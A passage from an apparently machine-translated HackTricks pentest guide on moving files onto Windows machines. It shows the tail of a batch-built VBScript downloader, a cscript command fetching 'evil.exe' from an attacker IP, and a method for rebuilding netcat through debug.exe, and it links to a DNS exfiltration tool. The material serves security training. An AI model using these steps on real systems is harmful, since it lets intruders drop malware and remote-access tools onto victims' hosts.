echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Program `debug.exe` ne samo da omogućava inspekciju binarnih fajlova, već ima i mogućnost da ih ponovo izgradi iz heksadecimalnog formata. To znači da `debug.exe` može generisati binarni fajl na osnovu heksadecimalnog zapisa. Međutim, važno je napomenuti da `debug.exe` ima ograničenje da može sastaviti fajlove veličine do 64 kb.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Zatim kopirajte i zalijepite tekst u Windows Shell i kreirat će se datoteka nazvana nc.exe.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage prijetnji, pronalazi probleme u cijelom vašem tehnološkom skupu, od API-ja do web aplikacija i oblak sustava. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naučite hakiranje AWS-a od nule do heroja s</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite vidjeti **oglašavanje vaše tvrtke u HackTricks-u** ili **preuzeti HackTricks u PDF-u**, provjerite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**službeni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podijelite svoje trikove hakiranja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorije.

</details>
